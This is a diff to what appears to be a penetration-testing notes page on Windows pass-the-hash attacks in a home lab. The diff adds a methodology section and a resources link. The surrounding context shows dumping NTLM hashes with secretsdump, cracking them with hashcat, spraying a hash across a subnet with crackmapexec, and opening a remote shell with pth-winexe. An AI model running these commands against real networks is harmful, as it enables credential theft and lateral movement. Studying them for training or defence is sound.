@@ -65,9 +65,16 @@ C:\Windows\system32>hostname
 THEDEFENDER
 ```
 
-## Dumping Hashes
+## Pass the Hash
+
+- Methodology
+  - Here is what we can do after dumping the hashes:
+  - Crack them with hashcat
+  - Use them with tools like: smbclient or pth-smbclient, psexec, wmiexec or pth-wmic, rpcdump or pth-rpcclient, ... 
+  - See [here](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/) for detailed explainations on how to use the mentioned tools
 
 ### Impacket - Secretsdump.py
+
 - We can dump hashes from our compromised machines in the network
 ```
 ┌──(root💀kali)-[~kali]
@@ -90,6 +97,7 @@ Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b9
 ## Crack NTLM hashes
 
 ### Hashcat
+
 ```
 ┌──(root💀kali)-[~kali]
 └─# hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
@@ -120,10 +128,13 @@ Here is the structure of the hash: `User Name:ID:LMHASH:NTHASH:::`
 With this: `Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`  
 We will use this: `64f12cddaa88057e06a81b54e73b949b`  
 We will then use this command:
+
 ```
 crackmapexec smb 10.0.2.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
+
 We would get something like this:
+
 ```
 SMB         10.0.2.15       445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
 SMB         10.0.2.5        445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
@@ -161,3 +172,6 @@ C:\Windows\system32>
 - `pth-winexe -U 'admin%hash' //10.10.67.135 cmd.exe`  
 ![image](https://user-images.githubusercontent.com/96747355/170795331-ac079349-993c-46ec-b6ce-329b9c20728f.png)  
 
+## Resources
+
+{% embed url="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" %} Lateral Movement: Pass the Hash Attack - Raj Chandel{% endembed %}  
